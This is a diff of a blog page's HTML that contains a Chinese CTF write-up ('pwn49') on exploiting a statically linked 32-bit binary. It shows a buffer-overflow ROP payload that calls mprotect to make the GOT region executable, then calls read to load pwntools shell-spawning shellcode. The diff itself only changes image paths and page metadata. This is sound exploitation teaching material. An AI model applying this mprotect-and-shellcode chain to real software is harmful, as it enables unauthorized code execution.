@@ -29,17 +29,17 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="首先可以了解mprotect函数，这有佬的文章,可以先看一下 静态文件基本都有mprotect函数 我们们的思路基本就是，利用mprotect函数修改某段的权限，然后将shellcode写入这段  开始写wp  先用IDA打开有mprotect函数  用一下命令查看      1file xxxx #查看是否是静态文件      ​    圈出部分显示是静态文件  我们先用mprotect函数修">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png">
 <meta property="article:published_time" content="2025-02-27T04:50:51.000Z">
-<meta property="article:modified_time" content="2025-09-23T12:47:59.488Z">
+<meta property="article:modified_time" content="2025-09-23T12:47:59.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/">
 
@@ -108,7 +108,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -202,7 +202,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -279,7 +279,7 @@
 </ol>
    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file xxxx #查看是否是静态文件</span><br></pre></td></tr></table></figure>
 
-<p>   <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png" alt="1"></p>
+<p>   <img src="/./pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png" alt="1"></p>
 <p>​    圈出部分显示是静态文件</p>
 <ol start="3">
 <li><p>我们先用mprotect函数修改一段的权限(就选got表)</p>
@@ -287,23 +287,23 @@
 
 
 
-<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png" alt="2"></p>
+<p><img src="/./pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png" alt="2"></p>
 </li>
 </ol>
 <p>​     可以看到got的起始地址是0x80da000，先构造mprotect的payload</p>
-<p>​     查看mprotect函数的地址<br>​     <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png" alt="3"></p>
+<p>​     查看mprotect函数的地址<br>​     <img src="/./pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png" alt="3"></p>
 <p>用ROPgadget来找pop ret</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only “pop|ret” | grep &quot;pop&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png" alt="4"></p>
+<p><img src="/./pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png" alt="4"></p>
 <p>mprotect的第一个参数是需要修改内存的地址，第二个参数是内存空间的大小，第三是需要赋予的权限，再将mprotect的返回地址设置为read的地址，用来读取shellcode</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br></pre></td></tr></table></figure>
 
 
 
-<p>再找read的地址,0x806BEE0,read第一个参数是一随便写点就可以，参数二就是我们的shellcode，参数三是读取的大小<br><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png" alt="5"></p>
+<p>再找read的地址,0x806BEE0,read第一个参数是一随便写点就可以，参数二就是我们的shellcode，参数三是读取的大小<br><img src="/./pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png" alt="5"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br><span class="line">payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)</span><br><span class="line">payload += p32(0x0) </span><br><span class="line">payload += p32(0x080da000) # shellcode地址</span><br><span class="line">payload += p32(len(shellcode))</span><br></pre></td></tr></table></figure>
 
 
@@ -416,7 +416,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
